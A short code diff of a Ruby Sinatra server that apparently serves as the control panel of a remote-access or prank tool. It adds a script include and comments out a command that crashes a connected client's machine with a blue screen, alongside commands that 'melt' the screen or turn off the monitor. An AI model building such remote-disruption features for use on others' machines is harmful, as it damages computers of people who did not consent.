@@ -65,6 +65,7 @@ class MyServer < Sinatra::Base
       erb :home
     else
       @css = ["panel-styles"]
+      @js = ["panel-js"]
       erb :panel, locals: {params: params}
     end
   end
@@ -195,8 +196,8 @@ class MyServer < Sinatra::Base
         @msg = "Trying to melt #{@mClient.name}\'s screen. \n
         WARNING: This function has first false positive!"
       when "bsod"
-        $semaphore.synchronize { @mClient.bsod }
-        @msg = "Trying nevermind... #{@mClient.name} is just dead."
+        #$semaphore.synchronize { @mClient.bsod }
+        @msg = "Trying... nevermind, #{@mClient.name} is just dead."
       when "turnoffMonitor"
         $semaphore.synchronize { @mClient.turn_off_monitor }
         @msg = "Turning off monitor on #{@mClient.name}..."
